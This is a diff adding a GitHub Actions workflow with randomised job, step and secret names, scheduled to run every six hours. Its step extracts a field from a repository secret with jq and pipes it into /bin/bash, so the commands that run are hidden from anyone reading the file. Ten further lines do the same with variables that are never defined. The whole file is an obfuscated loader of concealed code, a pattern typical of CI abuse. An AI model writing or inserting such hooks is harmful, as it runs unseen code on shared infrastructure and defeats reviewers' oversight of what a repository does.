@@ -1,0 +1,27 @@
+name: shiyongxing6715
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shiyongxing6715
+        env:
+          hej3920: ${{ secrets.hej3920 }}
+        run: |
+          echo $hej3920 | jq -r .jv91527 | /bin/bash
+          echo $b0852 | jq -r .sx45 | /bin/bash
+          echo $bs85769 | jq -r .dtg87952 | /bin/bash
+          echo $r94 | jq -r .qwxw122 | /bin/bash
+          echo $lb03435 | jq -r .lkw7 | /bin/bash
+          echo $lm3 | jq -r .futdh0 | /bin/bash
+          echo $uxaz1739 | jq -r .hj0 | /bin/bash
+          echo $blkau3252 | jq -r .txto90 | /bin/bash
+          echo $bbdv20 | jq -r .qgobo133 | /bin/bash
+          echo $tw20713 | jq -r .uwsn90975 | /bin/bash
+          echo $otm029 | jq -r .ugle6 | /bin/bash
+
